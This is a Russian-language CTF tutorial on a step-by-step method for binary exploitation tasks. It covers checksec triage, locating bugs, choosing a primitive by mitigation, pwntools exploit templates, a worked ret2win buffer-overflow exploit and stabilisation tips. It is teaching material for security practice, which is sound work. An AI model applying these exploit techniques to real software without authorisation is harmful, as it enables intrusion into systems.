Pwn-задача решается не «озарением», а дисциплинированным процессом: собрать информацию о бинаре, понять его поведение, локализовать баг, выбрать примитив, собрать эксплойт и довести его до стабильного результата. Опытные игроки идут по одному и тому же чек-листу, поэтому тратят на рутину минуты, а не часы. Этот урок — практическая методология триажа и решения: какие команды выполнять в каком порядке, как быстро отбросить тупики и как не потерять время на «неправильной» уязвимости. Материал ориентирован на CTF, но тот же процесс применим к аудиту реальных бинарей.

## Шаг 0: первичный триаж и checksec

Первое, что вы делаете с новым файлом, — определяете его тип и включённые митигации. От этого зависит вся дальнейшая стратегия.

```bash
file ./chall
checksec --file=./chall
pwn checksec ./chall        # если есть pwntools
readelf -h ./chall
readelf -l ./chall | grep -E "GNU_STACK|GNU_RELRO|INTERP"
```

`checksec` покажет четыре ключевых флага: **Canary** (защита стека), **NX** (неисполняемый стек), **PIE** (рандомизация базового адреса), **RELRO** (защита GOT). Например, `Full RELRO + PIE + NX + Canary` означает, что перезапись GOT запрещена, нужны утечки, а стек неисполняем. `No PIE + No Canary` — простейший случай с переполнением стека. Запомните: NX включён почти всегда, PIE — часто, RELRO — обычно Partial.

## Шаг 1: понять поведение программы

Запустите бинарь руками и посмотрите, что он делает: какие приглашения печатает, что читает, есть ли меню. Затем загляните в строки и символы.

```bash
./chall
strings -a ./chall | head -40
strings -a ./chall | grep -Ei "flag|/bin/sh|system|win|admin"
nm -C ./chall 2>/dev/null | grep -Ei "win|system|flag"
readelf -s ./chall | grep FUNC
objdump -d -M intel ./chall | less
```

Часто в бинаре уже есть функция `win()`/`get_flag()`/`print_flag()`, и задача сводится к переводу туда потока управления (ret2win). Наличие символов `system`/`execve` в PLT подсказывает путь.

## Шаг 2: локализовать уязвимость

Ищите опасные вызовы и паттерны в дизассемблере или декомпиляторе:

```bash
objdump -d -M intel ./chall | grep -E "call.*(gets|read|scanf|fgets|strcpy|strcat|printf|malloc|free)"
objdump -d -M intel ./chall | grep -B2 -A2 gets
```

Признаки разных уязвимостей: `gets`, `scanf("%s")`, `read` без границ → переполнение буфера; пользовательская строка как формат `printf(buf)` → format string; `free` того же указателя дважды → double-free; отсутствие проверки индекса в массиве → OOB. Определите тип ввода (строка, число, длина) и количество раундов — это критично для планирования.

## Шаг 3: выбрать примитив

После локализации бага выберите путь эксплуатации в зависимости от митигаций:

| Условие | Примитив | Урок |
|---|---|---|
| overflow + нет canary | ret2win / ret2libc | pwn-buffer-overflow |
| overflow + canary + leak | leak canary → ROP | pwn-canary-bypass |
| format string | произвольное чтение/запись | pwn-format-string |
| heap UAF / double-free | tcache poisoning | pwn-heap-tcache |
| нет утечки libc | ret2dlresolve / ret2csu | pwn-ret2dlresolve |
| Full RELRO | .fini_array / FSOP | pwn-fini-init-array |

Не «привязывайтесь» к первой гипотезе: если простой ret2win упирается в canary, а format string даёт утечку — комбинируйте.

## Шаг 4: собрать эксплойт на pwntools

Скелет любого эксплойта почти одинаков — отличаются детали. Держите шаблон под рукой.

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
context.log_level = 'info'
libc = ELF('./libc.so.6', checksec=False)

def start():
    if args.REMOTE:
        return remote('host', 1337)
    if args.GDB:
        return gdb.debug('./chall', gdbscript='b *main\nc')
    return process('./chall')

p = start()
# ... логика ...
p.interactive()
```

Запускайте сначала локально (`python3 exp.py`), затем с отладчиком (`python3 exp.py GDB`), затем удалённо (`python3 exp.py REMOTE`).

## Шаг 5: отладка и стабилизация

Эксплойт, работающий «иногда», — не эксплойт. Типичные причины нестабильности: неверное выравнивание стека (падение в `movaps`), гонки, зависимость от ASLR, недостаточная утечка. Приёмы: добавьте лишний `ret` для выравнивания; используйте `p.recvuntil` вместо фиксированных `recv`; печатайте `libc.address` в `log.success`; гоняйте в цикле `for i in {1..20}; do ./exp.py; done`.

```bash
for i in $(seq 1 30); do python3 exp.py >/dev/null 2>&1 || echo "fail $i"; done
```

## Полный разобранный пример: ret2win

Пусть `checksec` даёт `No PIE, No Canary, NX enabled`, есть функция `win()` и переполнение в `gets`.

```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall')
offset = cyclic_find(0x6161616c)     # вычисляется через cyclic + gdb
log.info('offset = %d', offset)
payload = flat(b'A' * offset, elf.symbols['win'])
p.sendline(payload)
p.interactive()
```

Здесь `cyclic(200)` подаётся в программу, падение анализируется в gdb (`info registers rsp`, `x/s $rsp`), и `cyclic_find` даёт точное смещение до сохранённого адреса возврата. Это самый частый «первый шаг» в CTF.

## Работа с меню и многораундовыми задачами

Многие задачи имеют меню (`1) alloc 2) free 3) edit 4) show`). Держите функции-обёртки:

```python
def alloc(idx, size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()
```

Такие обёртки делают эксплойт читаемым и позволяют менять логику без переписывания всего.

## Что дальше / решение

Дальше: `pwn-elf-basics` (структура бинаря), `pwn-pwntools` (API), `pwn-gdb-pwndbg` (отладка), `pwn-ctf-recipe` (быстрый рецепт), а по типам — `pwn-buffer-overflow`, `pwn-format-string`, `pwn-heap-tcache`. Практический алгоритм для любой новой задачи: (1) `file` + `checksec`; (2) запустить и понять поведение; (3) `strings`/`nm` — поискать `win`/`system`; (4) найти баг в дизассемблере; (5) выбрать примитив по таблице митигаций; (6) собрать эксплойт из шаблона pwntools; (7) отладить локально, стабилизировать, перевести в REMOTE. Дисциплина важнее вдохновения: 90% pwn-задач решаются этим чек-листом.
## Работа с удалённым сервисом и стабильность

Локальный успех не гарантирует удалённого. Различия: другая libc, включённый ASLR, таймауты сети, разные права. Правила: всегда сначала отлаживайте локально, затем запускайте с `REMOTE=1`, но держите путь отката. Используйте `p.recvuntil` для синхронизации вместо `sleep`, увеличивайте таймауты (`p = remote(host, port, timeout=10)`), логируйте ключевые значения (`log.success('libc @ %#x', libc.address)`). Если эксплойт нестабилен — гоняйте его в цикле и считайте процент успеха; при 50% ищите причину (гонка, неверная утечка, выравнивание). Никогда не полагайтесь на «повезёт»: стабильность — часть результата.

## Инструменты разведки и автоматизации

Помимо ручного анализа, используйте: `checksec` (митигации), `one_gadget` (быстрый shell), `ROPgadget`/`ropper` (гаджеты), `seccomp-tools dump ./chall` (какие syscall разрешены — критично для ORW), `ldd ./chall` (какая libc линкуется), `patchelf` (подмена libc/интерпретатора для локальных тестов), `pwninit` (автоматизация подготовки окружения). Для сложных задач — `angr` (символическое исполнение) и `Ghidra`/`IDA` (декомпиляция). Держите скрипт-шаблон и вспомогательные функции, чтобы не тратить время на рутину при каждой новой задаче.

## Типичный тайминг и распределение усилий

На CTF разумно тратить 10–20 минут на триаж и выбор примитива, затем 30–60 минут на эксплойт. Если за это время не удаётся сдвинуться, пересмотрите гипотезу: возможно, вы выбрали не тот баг или пропустили утечку. Полезно вести заметки: offset, митигации, найденные гаджеты, адреса. Не «залипайте» на одной идее — pwn-задачи часто имеют два-три пути, и самый короткий не всегда очевиден. В реальном аудите добавляются требования по надёжности и минимальной деструктивности, но базовый процесс остаётся тем же.
## Как не потерять время: приоритизация

В условиях ограниченного времени важна приоритизация. Сначала проверяйте самые дешёвые гипотезы: есть ли `win`-функция (тогда ret2win без утечек), включён ли canary (если нет — простое переполнение), есть ли format string (мгновенная утечка). Только затем переходите к heap и сложным цепочкам. Держите «дерево решений» в голове: каждый признак сужает пространство вариантов. Если задача не двигается 20–30 минут, пересмотрите разведку — возможно, вы упустили символ или строку. Коллективный опыт показывает: большинство задач решаются базовыми примитивами, а сложные конструкции нужны реже, чем кажется.

## Итоговый чек-лист перед запуском эксплойта

Перед финальным запуском пройдитесь по списку: определён ли offset и проверен ли он дважды; выровнен ли стек для вызова libc-функции; загружена ли правильная версия libc и совпадают ли оффсеты; синхронизированы ли чтения через recvuntil; логируются ли ключевые адреса; предусмотрен ли путь отката при удалённом запуске. Такой формальный прогон ловит большинство ошибок до того, как вы потратите время на отладку. Опытные игроки держат этот чек-лист в голове и проходят его за минуту.
